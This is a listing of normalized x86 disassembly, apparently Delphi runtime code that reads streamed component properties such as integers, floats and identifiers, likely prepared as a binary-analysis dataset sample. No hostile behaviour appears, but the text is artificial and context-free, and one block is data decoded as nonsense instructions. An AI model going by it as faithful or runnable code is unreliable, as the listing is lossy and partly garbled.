call sub_413fcc
jmp r-xdata
mov eax ebx
call sub_4169bc
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_4175e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416b7b
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_413fac
mov esi eax
mov eax ebx
call sub_4175dc
jmp r-xdata
mov eax ebx
call sub_41752c
mov eax ebx
call sub_416678
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_417748
mov eax ebx
call sub_4175e4
sub_416ba4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404d58
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_413650
inc esi
dec ebx
jne r-xdata
sub_416be0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_419770
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404d58
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404f14
add esp 0x4
mov edx ebx
mov eax edi
call sub_419744
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404d58
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_419744
test [ eax + 0x24 ] 0x4
je r-xdata
sub_416c58
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404d58
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_416cc0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_416ce0
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40274c
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_416cc0
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_418710
call sub_40274c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403258
sub_416d40
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_416e26
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4188b0
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_416dfa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_416e2b
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416ce0
pop ecx
test al al
jne r-xdata
call sub_403a48
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039f4
sub_416e50
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_416ec8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403454
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_4132f8
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_416ecd
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416ce0
pop ecx
test al al
jne r-xdata
call sub_403a48
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039f4
sub_416ef0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_416f6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4188b0
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403454
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_416f70
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416ce0
pop ecx
test al al
jne r-xdata
call sub_403a48
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039f4
sub_416f94
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4171b5
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_418240
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_418240
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_417185
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_417143
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_416be0
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_416c58
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_416d40
pop ecx
push ebp
call sub_416ef0
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_416e50
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403a78
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_416c58
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_416c58
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4171bc
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403fb4
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_404f20
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403454
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413808
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_416ba4
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413650
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_416ba4
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413650
sub_417148
push ebp
call sub_416cc0
pop ecx
test al al
je r-xdata
call sub_4039f4
call sub_403a48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403258
sub_4171d0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417240
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41722b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417240
mov eax [ ebp - 0x4 ]
call sub_416790
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4168d4
retn
sub_417240
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_416678
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417748
mov eax [ ebp - 0x4 ]
call sub_4175e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403454
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_417302
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403454
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_416678
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_416f94
mov eax [ ebp - 0x4 ]
call sub_4175e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417309
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_417310
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41841c
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417598
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_4169e0
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_417354
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41841c
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417598
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4169e0
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_417398
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41841c
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417598
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_4169e0
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_4173e8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41841c
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417598
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_4169e0
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41742c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41841c
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_4164b8
mov al [ eax + lookup_table_417453 ]
jmp [ eax * 4 + jump_table_417461 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4169e0
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404080
mov eax esi
call j_sub_40445c
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_4169e0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fe4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fe4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fe4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fe4
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41752c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41841c
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_4169e0
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_4169e0
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4169e0
jmp r-xdata
jmp r-xdata
call sub_4164b8
sub_417598
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4169bc
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41752c
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41841c
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_4169e0
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_4175ec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_4169bc
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41841c
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41752c
mov [ edi ] eax
sub_41762c
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41771d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403f90
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404028
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
call sub_4039cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417724
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031a8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041f4
sub_417748
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_417918
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_40380c#2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418240
xor edx edx
push ebp
push j_sub_40380c
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_404250
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4044b0
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403480
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_4105cc
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403480
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_4105cc
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_417acc
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_4169cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_4169cc
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_41063c
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41772c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41791f
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov edi ebx
jmp r-xdata
sub_4178d2
add [ eax ] eax
add [ eax ] al
or al 0x6e
inc eax
add dh bl
js r-xdata
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_4039f4
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41791f
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
sub_417928
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_4131a0
mov ebx eax
test ebx ebx
je r-xdata
call sub_4164b8
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4106b0
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417970
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_415f4c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413650
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4179b0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_4179ff
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418b34
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_410b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a06
lea eax [ ebp - 0x10 ]
call sub_40e720
retn
sub_417a0c
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_417abe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4169bc
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41742c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_415f4c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413650
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41841c
lea eax [ ebp - 0x4 ]
call sub_4055cc
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_410c00
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417ac5
lea eax [ ebp - 0x8 ]
call sub_403f90
lea eax [ ebp - 0x4 ]
call sub_4055cc
retn
sub_417acc
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417dc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417dce
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403fb4
lea eax [ ebp - 0x24 ]
call sub_404670
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fb4
retn
